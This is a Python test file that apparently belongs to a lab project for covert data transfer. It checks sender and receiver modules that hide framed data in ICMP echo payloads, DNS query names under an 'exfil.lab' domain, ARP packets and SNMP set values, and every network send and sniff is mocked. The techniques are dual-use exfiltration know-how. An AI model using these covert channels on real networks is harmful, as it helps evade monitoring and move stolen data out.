from __future__ import annotations

from scapy.all import ARP, ASN1_OID, ASN1_STRING, DNS, DNSQR, Ether, ICMP, IP, Raw, SNMP, SNMPresponse, SNMPset, SNMPvarbind, UDP  # type: ignore

from common.config import TYPE_ACK, TYPE_DATA, TYPE_NACK
from common.dns_tunnel import frame_bytes_to_qname, qname_to_frame_bytes
from common.frame import Frame
from receiver import dns_transport as receiver_dns_transport
from receiver import transport as receiver_icmp_transport
from receiver import arp_transport as receiver_arp_transport
from receiver import snmp_transport as receiver_snmp_transport
from sender import dns_transport as sender_dns_transport
from sender import transport as sender_icmp_transport
from sender import arp_transport as sender_arp_transport
from sender import snmp_transport as sender_snmp_transport


def _icmp_packet(src_ip: str, frame: Frame):
    return IP(src=src_ip, dst="10.0.0.1") / ICMP(type=8, code=0) / Raw(load=frame.pack())


def _dns_packet(src_ip: str, frame: Frame, domain: str, port: int):
    qname = frame_bytes_to_qname(frame.pack(), domain)
    return IP(src=src_ip, dst="10.0.0.1") / UDP(sport=5353, dport=port) / DNS(
        rd=1, qd=DNSQR(qname=qname, qtype="A")
    )


def _arp_packet(src_ip: str, frame: Frame, op: int = 1):
    return (
        Ether(src="aa:bb:cc:dd:ee:01", dst="ff:ff:ff:ff:ff:ff")
        / ARP(op=op, hwsrc="aa:bb:cc:dd:ee:01", psrc=src_ip, hwdst="00:00:00:00:00:00", pdst="10.0.0.1")
        / Raw(load=frame.pack())
    )


def _snmp_packet(src_ip: str, frame: Frame, oid: str, community: str, port: int, response: bool = False):
    pdu_cls = SNMPresponse if response else SNMPset
    pdu = pdu_cls(id=1234, varbindlist=[SNMPvarbind(oid=ASN1_OID(oid), value=ASN1_STRING(frame.pack()))])
    return IP(src=src_ip, dst="10.0.0.1") / UDP(sport=35000, dport=port) / SNMP(community=community, PDU=pdu)


def test_icmp_send_frame_embeds_frame_bytes(monkeypatch):
    captured = {}
    frame = Frame(msg_type=TYPE_DATA, session_id=12, seq=1, total=1, payload=b"icmp-test")

    def fake_send(pkt, iface, verbose):
        captured["pkt"] = pkt
        captured["iface"] = iface
        captured["verbose"] = verbose

    monkeypatch.setattr(sender_icmp_transport, "send", fake_send)

    sender_icmp_transport.send_frame("10.0.0.2", frame, iface="eth0")

    raw = bytes(captured["pkt"][Raw].load)
    unpacked = Frame.unpack(raw)
    assert unpacked == frame
    assert captured["iface"] == "eth0"
    assert captured["verbose"] is False


def test_icmp_wait_for_ack_and_nack(monkeypatch):
    peer_ip = "10.0.0.2"
    session_id = 99
    seq = 5

    ack_frame = Frame(msg_type=TYPE_ACK, session_id=session_id, seq=seq, total=10, payload=b"")
    nack_frame = Frame(msg_type=TYPE_NACK, session_id=session_id, seq=seq, total=10, payload=b"MISSING:3")

    monkeypatch.setattr(sender_icmp_transport, "sniff", lambda **kwargs: [_icmp_packet(peer_ip, ack_frame)])
    ok, status = sender_icmp_transport.wait_for_ack("eth0", peer_ip, session_id, seq, timeout=0.1)
    assert ok is True
    assert status == "ACK"

    monkeypatch.setattr(sender_icmp_transport, "sniff", lambda **kwargs: [_icmp_packet(peer_ip, nack_frame)])
    ok, status = sender_icmp_transport.wait_for_ack("eth0", peer_ip, session_id, seq, timeout=0.1)
    assert ok is False
    assert status == "NACK:MISSING:3"


def test_icmp_receiver_extract_frame():
    peer_ip = "10.0.0.2"
    frame = Frame(msg_type=TYPE_DATA, session_id=1, seq=2, total=3, payload=b"chunk")
    pkt = _icmp_packet(peer_ip, frame)

    parsed = receiver_icmp_transport.extract_frame(pkt, peer_ip)
    assert parsed == frame


def test_dns_send_frame_embeds_frame_bytes(monkeypatch):
    captured = {}
    domain = "exfil.lab"
    frame = Frame(msg_type=TYPE_DATA, session_id=42, seq=1, total=1, payload=b"dns-test")

    def fake_send(pkt, iface, verbose):
        captured["pkt"] = pkt
        captured["iface"] = iface
        captured["verbose"] = verbose

    monkeypatch.setattr(sender_dns_transport, "send", fake_send)

    sender_dns_transport.send_frame("10.0.0.2", frame, iface="eth0", dns_domain=domain, dns_port=5300)

    qname = captured["pkt"][DNS].qd[0].qname.decode("ascii", errors="ignore")
    raw = qname_to_frame_bytes(qname, domain)
    assert raw == frame.pack()
    assert captured["iface"] == "eth0"
    assert captured["verbose"] is False


def test_dns_wait_for_ack_and_nack(monkeypatch):
    peer_ip = "10.0.0.2"
    domain = "exfil.lab"
    dns_port = 5300
    session_id = 100
    seq = 7

    ack_frame = Frame(msg_type=TYPE_ACK, session_id=session_id, seq=seq, total=10, payload=b"")
    nack_frame = Frame(msg_type=TYPE_NACK, session_id=session_id, seq=seq, total=10, payload=b"BAD_SEQ")

    monkeypatch.setattr(
        sender_dns_transport,
        "sniff",
        lambda **kwargs: [_dns_packet(peer_ip, ack_frame, domain=domain, port=dns_port)],
    )
    ok, status = sender_dns_transport.wait_for_ack(
        iface="eth0",
        peer_ip=peer_ip,
        session_id=session_id,
        seq=seq,
        timeout=0.1,
        dns_domain=domain,
        dns_port=dns_port,
    )
    assert ok is True
    assert status == "ACK"

    monkeypatch.setattr(
        sender_dns_transport,
        "sniff",
        lambda **kwargs: [_dns_packet(peer_ip, nack_frame, domain=domain, port=dns_port)],
    )
    ok, status = sender_dns_transport.wait_for_ack(
        iface="eth0",
        peer_ip=peer_ip,
        session_id=session_id,
        seq=seq,
        timeout=0.1,
        dns_domain=domain,
        dns_port=dns_port,
    )
    assert ok is False
    assert status == "NACK:BAD_SEQ"


def test_dns_receiver_extract_frame():
    peer_ip = "10.0.0.2"
    domain = "exfil.lab"
    dns_port = 5300
    frame = Frame(msg_type=TYPE_DATA, session_id=9, seq=2, total=4, payload=b"payload")
    pkt = _dns_packet(peer_ip, frame, domain=domain, port=dns_port)

    parsed = receiver_dns_transport.extract_frame(pkt, peer_ip, dns_domain=domain, dns_port=dns_port)
    assert parsed == frame


def test_arp_send_frame_embeds_frame_bytes(monkeypatch):
    captured = {}
    frame = Frame(msg_type=TYPE_DATA, session_id=17, seq=1, total=1, payload=b"arp-test")

    def fake_sendp(pkt, iface, verbose):
        captured["pkt"] = pkt
        captured["iface"] = iface
        captured["verbose"] = verbose

    monkeypatch.setattr(sender_arp_transport, "sendp", fake_sendp)
    monkeypatch.setattr(sender_arp_transport, "get_if_hwaddr", lambda iface: "aa:bb:cc:dd:ee:ff")
    monkeypatch.setattr(sender_arp_transport, "get_if_addr", lambda iface: "10.0.0.10")

    sender_arp_transport.send_frame("10.0.0.2", frame, iface="eth0")

    raw = bytes(captured["pkt"][Raw].load)
    unpacked = Frame.unpack(raw)
    assert unpacked == frame
    assert captured["pkt"][ARP].pdst == "10.0.0.2"
    assert captured["iface"] == "eth0"
    assert captured["verbose"] is False


def test_arp_wait_for_ack_and_nack(monkeypatch):
    peer_ip = "10.0.0.2"
    session_id = 88
    seq = 3

    ack_frame = Frame(msg_type=TYPE_ACK, session_id=session_id, seq=seq, total=5, payload=b"")
    nack_frame = Frame(msg_type=TYPE_NACK, session_id=session_id, seq=seq, total=5, payload=b"BAD_SEQ")

    monkeypatch.setattr(sender_arp_transport, "sniff", lambda **kwargs: [_arp_packet(peer_ip, ack_frame, op=2)])
    ok, status = sender_arp_transport.wait_for_ack("eth0", peer_ip, session_id, seq, timeout=0.1)
    assert ok is True
    assert status == "ACK"

    monkeypatch.setattr(sender_arp_transport, "sniff", lambda **kwargs: [_arp_packet(peer_ip, nack_frame, op=2)])
    ok, status = sender_arp_transport.wait_for_ack("eth0", peer_ip, session_id, seq, timeout=0.1)
    assert ok is False
    assert status == "NACK:BAD_SEQ"


def test_arp_receiver_extract_frame():
    peer_ip = "10.0.0.2"
    frame = Frame(msg_type=TYPE_DATA, session_id=5, seq=2, total=3, payload=b"piece")
    pkt = _arp_packet(peer_ip, frame)

    parsed = receiver_arp_transport.extract_frame(pkt, peer_ip)
    assert parsed == frame


def test_snmp_send_frame_embeds_frame_bytes(monkeypatch):
    captured = {}
    frame = Frame(msg_type=TYPE_DATA, session_id=22, seq=1, total=1, payload=b"snmp-test")
    oid = "1.3.6.1.4.1.55555.1.0"
    community = "public"
    port = 161

    def fake_send(pkt, iface, verbose):
        captured["pkt"] = pkt
        captured["iface"] = iface
        captured["verbose"] = verbose

    monkeypatch.setattr(sender_snmp_transport, "send", fake_send)
    monkeypatch.setattr(sender_snmp_transport.random, "randint", lambda a, b: 33333)

    sender_snmp_transport.send_frame(
        "10.0.0.2",
        frame,
        iface="eth0",
        snmp_oid=oid,
        snmp_port=port,
        snmp_community=community,
    )

    vb = captured["pkt"][SNMP].PDU.varbindlist[0]
    assert vb.value.val == frame.pack()
    assert str(vb.oid.val) == oid
    assert captured["pkt"][UDP].dport == port
    assert captured["iface"] == "eth0"
    assert captured["verbose"] is False


def test_snmp_wait_for_ack_and_nack(monkeypatch):
    peer_ip = "10.0.0.2"
    oid = "1.3.6.1.4.1.55555.1.0"
    community = "public"
    port = 161
    session_id = 77
    seq = 4

    ack_frame = Frame(msg_type=TYPE_ACK, session_id=session_id, seq=seq, total=9, payload=b"")
    nack_frame = Frame(msg_type=TYPE_NACK, session_id=session_id, seq=seq, total=9, payload=b"NO_HELLO")

    monkeypatch.setattr(
        sender_snmp_transport,
        "sniff",
        lambda **kwargs: [_snmp_packet(peer_ip, ack_frame, oid=oid, community=community, port=port, response=True)],
    )
    ok, status = sender_snmp_transport.wait_for_ack(
        iface="eth0",
        peer_ip=peer_ip,
        session_id=session_id,
        seq=seq,
        timeout=0.1,
        snmp_oid=oid,
        snmp_port=port,
        snmp_community=community,
    )
    assert ok is True
    assert status == "ACK"

    monkeypatch.setattr(
        sender_snmp_transport,
        "sniff",
        lambda **kwargs: [_snmp_packet(peer_ip, nack_frame, oid=oid, community=community, port=port, response=True)],
    )
    ok, status = sender_snmp_transport.wait_for_ack(
        iface="eth0",
        peer_ip=peer_ip,
        session_id=session_id,
        seq=seq,
        timeout=0.1,
        snmp_oid=oid,
        snmp_port=port,
        snmp_community=community,
    )
    assert ok is False
    assert status == "NACK:NO_HELLO"


def test_snmp_receiver_extract_frame():
    peer_ip = "10.0.0.2"
    oid = "1.3.6.1.4.1.55555.1.0"
    community = "public"
    port = 161
    frame = Frame(msg_type=TYPE_DATA, session_id=6, seq=2, total=3, payload=b"snmp-data")
    pkt = _snmp_packet(peer_ip, frame, oid=oid, community=community, port=port, response=False)

    parsed = receiver_snmp_transport.extract_frame(
        pkt,
        peer_ip=peer_ip,
        snmp_oid=oid,
        snmp_port=port,
        snmp_community=community,
    )
    assert parsed == frame
